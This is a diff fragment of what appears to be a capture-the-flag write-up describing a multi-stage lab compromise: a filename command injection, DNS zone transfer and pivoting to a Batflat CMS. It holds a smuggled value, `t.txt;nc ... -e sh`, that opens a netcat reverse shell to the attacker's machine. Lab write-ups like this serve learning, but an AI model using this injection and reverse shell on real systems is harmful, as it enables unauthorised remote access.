@@ -10,7 +10,7 @@ Bit of a tricky room, with multiple stages.
 
 2. This reveals a limit of 30 characters, and the presence of .txt or .rtf somewhere in the name. This can be abused to establish a netcat connection, e.g. with `t.txt;nc 168462808 44 -e sh`. Note that the ip address of the attack box is converted to its decimal representation (which still works) to reduce character count.
 
-3. On the machine, its obviously a docker container with limited access. However, in /etc/resolv.conf there is an entry for 'mofo.pwn'. This is also referenced in the site folder, where files you upload are sent to 'ftp.mofo.pwn'. Dig is on the machine, and via that you can run `dig axfr mofo.pwn` to get a set of IP addresses.
+3. On the machine, its obviously a docker container with limited access. However, in /etc/resolv.conf there is an entry for 'mofo.pwn'. This is also referenced in the site code, where files you upload are sent to 'ftp.mofo.pwn'. Dig is on the machine, and via that you can run `dig axfr mofo.pwn` to get a set of IP addresses.
 
 4. Of these, the ftp IP address is useful (192.168.150.12) and the IP address for a CMS (192.168.150.1). By establishing a proxy forward through this docker container (via chisel, meterpreter, reverse_ssh or whatever) the website on .1 is the Batflat CMS, which has a known authenticated exploit here: https://www.exploit-db.com/exploits/49573
 
